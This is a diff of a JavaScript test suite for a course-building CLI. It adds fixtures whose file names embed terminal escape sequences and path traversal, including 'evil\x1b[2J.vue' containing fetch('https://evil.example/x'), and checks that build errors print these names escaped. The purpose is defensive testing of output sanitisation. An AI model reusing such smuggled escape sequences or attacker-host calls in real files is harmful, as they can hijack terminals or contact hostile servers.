@@ -333,11 +333,17 @@ describe('built CLI (dist/cli.js)', () => {
       `${readFileSync(deck, 'utf8')}\n---\nsrc: "../../../../\x1b]0;PWNED\x07x.md"\n---\n`,
     )
     writeFileSync(path.join(ws, 'lessons', 'bad\x1b[2J.md'), '<PlantUml code="x" />\n')
+    mkdirSync(path.join(ws, 'components'), { recursive: true })
+    writeFileSync(
+      path.join(ws, 'components', 'evil\x1b[2J.vue'),
+      'fetch("https://evil.example/x")\n',
+    )
     const build = spawnSync(process.execPath, [distCli, 'build'], { cwd: ws, encoding: 'utf8' })
     expect(build.status).toBe(1)
     expect(build.stderr).toContain('course build failed')
     expect(build.stderr).toContain('\\x1b]0;PWNED\\x07x.md')
     expect(build.stderr).toContain('bad\\x1b[2J.md')
+    expect(build.stderr).toContain('evil\\x1b[2J.vue')
     expect(build.stderr + build.stdout).not.toMatch(controls)
   })
 
@@ -371,6 +377,10 @@ describe('npm package contents', () => {
       'templates/workspace/package.json',
       'templates/workspace/slides.md',
       'templates/workspace/scripts/check-deck.mjs',
+      'templates/workspace/addons/narration/package.json',
+      'templates/workspace/addons/narration/global-top.vue',
+      'templates/workspace/addons/narration/playback.ts',
+      'templates/workspace/addons/narration/setup/vite-plugins.ts',
     ]) {
       expect(files).toContain(expected)
     }
